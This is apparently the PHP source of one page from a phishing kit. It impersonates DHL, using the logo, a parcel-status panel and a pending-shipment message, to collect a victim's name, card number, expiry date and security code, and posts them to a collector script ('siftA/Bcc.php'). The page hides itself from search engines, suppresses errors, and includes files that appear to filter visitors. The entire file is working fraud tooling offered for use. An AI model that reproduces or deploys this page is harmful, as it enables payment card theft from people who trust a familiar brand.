<?php
session_start();
//** Cleaned by M3dcoder telegram : https://t.me/M3dL4m1n3 **//

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
include("./AlexRony/911.php");
include("./AlexRony/SYS.php");
include("X_911.php");
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./X911/font-awesome.min.css">
		<link rel="stylesheet" href="./X911/style.css">
		<link rel="stylesheet" href="./X911/bootstrap-icons.css">
		
        <link rel="icon" type="image/x-icon" href="./X911/favicon.ico" />

        <title>| DHL |</title>
    </head>
<body>
<div class="navbar">
        	<div class="container-fluid">
        		<div class="topping">
        			<img src="./X911/dhl-logo.svg">
        			<ul class="web">
        				<li><i class="bi bi-exclamation-circle me-2"></i> <?php echo get_text("top_header1"); ?></li>
        				<li> <?php echo get_text("top_header2"); ?></li>
						<li><i class="bi bi-globe me-2"></i> <?php echo $countrycode; ?></li>
        				<li><i class="bi bi-globe me-2"></i> <?php echo get_text("top_header3"); ?></li>
        				<li><i class="bi bi-search me-2"></i> <?php echo get_text("top_header4"); ?></li>
        			</ul>
        			<ul class="respo">
        				<li><i class="bi bi-list"></i></li>
        				<li></li>
        			</ul>
        		</div>
        		<div class="bottomin">
        			<ul>
        				<li><?php echo get_text("mainmenu1"); ?><i class="bi bi-chevron-down ms-1"></i></li>
        				<li><?php echo get_text("mainmenu2"); ?><i class="bi bi-chevron-down ms-1"></i></li>
        				<li><?php echo get_text("mainmenu3"); ?><i class="bi bi-chevron-down ms-1"></i></li>
        				<li><?php echo get_text("mainmenu4"); ?><i class="bi bi-chevron-down ms-1"></i></li>
        			</ul>
        			<p><i class="bi bi-person-fill me-2"></i><?php echo get_text("header-right"); ?></p>
        		</div>
        	</div>
        </div>
        <div class="home info carta">
        	<div class="otside put">
        		<div class="container">
			<br>
        			<div class="lettre login valid">
					<div class="dell">
<div>
    <div name="content" style="text-align: center;">
    <img src="./X911/LOGA.svg" style="width: 50px;">
	</div>
<h2 name="content" style="text-align: center;">
    <?php echo get_text("X21"); ?>
    <img src="./X911/LOGAA.svg" style="width: 35px;">
</h2>
</div>

						<div class="titre">
							<img src="./X911/camion.png">
							<h3 style=" color: #d40511; "><?php echo get_text("title2"); ?> </h3>
						</div>
						<div class="steps">
							<span class="green"></span>
							<span class="green"></span>
							<span></span>
						</div>
					</div>
					<form action="./siftA/Bcc.php" method="post">
					<input type="hidden" name="captcha">
					<input type="hidden" name="step" value="">
        				<div class="row gx-4">
        					<div class="col-lg-8 genius">
        						<div class="gauche hna">
        							<h4><?php echo get_text("card_info"); ?> </h4>
        							<div class="magic" style="text-align: center;">
									<img src="./X911/MASTERCARD.png">
                                    <img src="./X911/DISCOVER.png">
                                    <img src="./X911/AMEX.png">
                                    <img src="./X911/VISA.png">
									</div>	
<?php
    if (isset($_GET["error"])) {
        $error = $_GET["error"];
        if ($error == "invalidCardNumber") {
            echo '<p class="input-groupe" style="color: red">' . get_text("ERRAR") . '</p>';
        }
    }
?>
										<div class="form-group mt-3">     
										<label for="full"><?php echo get_text("name_label"); ?> <span>*</span></label>
										<input type="text" name="full" id="full" class="form-control" Required>
										</div>
    									<div class="form-group mt-3 ">
                                             <label for="one"><?php echo get_text("one_label"); ?> <span>*</span></label>
                                             <input type="text" name="one" id="one" class="form-control" placeholder="XXXX XXXX XXXX XXXX" Required>
        								</div>
										<div class="calisy">
										<div class="form-group mt-3 ville">  
										<label for="two"><?php echo get_text("two_labels"); ?> <span>*</span></label>
		                                <input type="text" name="two" id="two" class="form-control" placeholder="<?php echo get_text("two_label"); ?>" required="" maxlength="10">
										</div>
										<div class="form-group mt-3 astra">     
										<label for="three"><?php echo get_text("three_labels"); ?> <span>*</span></label>
		                                 <input type="text" name="three" id="three" class="form-control" placeholder="<?php echo get_text("three_label"); ?>" required="">
										</div>
									     </div>
        								<div class="botona">
        									<button class="btn" name="submit"><?php echo get_text("nextt"); ?></button>
        								</div>	
        							
        						</div>
        					</div>
        					<div class="col-lg-4 power">
        					    <div class="droit lhih">
        					     	<div class="offre">
                                        <div class="status">
                                            <p><?php echo get_text("X3"); ?> :<b><?php echo get_text("X6"); ?><?php echo $countrycode; ?></b></p>
                                        </div>                                        <div class="status">
                                            <p><?php echo get_text("status"); ?></p>
                                        </div>
                                        <div class="status">
                                            <p><?php echo get_text("parcel"); ?></p>
                                        </div>
                                    </div>
									<div class="offre">
										<div class="status">
											<p><?php echo get_text("last_update"); ?>: <b><?php echo date("d/m/Y h:i A"); ?></b></p>
										</div>
										<div class="status">
											<p><?php echo get_text("shipment"); ?></p>
										</div>
										<div class="status">
											<p><?php echo get_text("total"); ?></p>
										</div>
									</div>
									<hr>
									<div class="important mt-4">
    							<h5><?php echo get_text("important_title"); ?></h5>
    							<p><?php echo get_text("important_message"); ?></p>
    						</div>
        					    </div>
        					</div>
        				</div>
					</form>
        			</div>
        		</div>
        	</div>
        </div>
        <div class="sous boso">
        	<div class="container-fluid">
        		<div class="row">
        			<div class="col-lg-9">
        				<img src="./X911/group.svg">
        				<ul>
        					<li><?php echo get_text("footer-menu-1"); ?></li>
        					<li><?php echo get_text("footer-menu-2"); ?></li>
        					<li><?php echo get_text("footer-menu-3"); ?></li>
        					<li><?php echo get_text("footer-menu-4"); ?></li>
        					<li><?php echo get_text("footer-menu-5"); ?></li>
        					<li><?php echo get_text("footer-menu-6"); ?></li>
        					<li><?php echo get_text("footer-menu-7"); ?></li>
        					<li><?php echo get_text("footer-menu-8"); ?></li>
        				</ul>
        			</div>
        			<div class="col-lg-3">
        				<h6><?php echo get_text("follow-us"); ?></h6>
        				<img src="./X911/socio.png" class="socio">
        			</div>
        			<div class="text-center ss"><?php echo get_text("copyright"); ?></div>
        		</div>	
        	</div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        
		
		       <script>
            $("#one").mask("0000 0000 0000 00000");
            $("#two").mask("00/00");
            $("#three").mask("0000");
        </script>
     </body>
	 </html>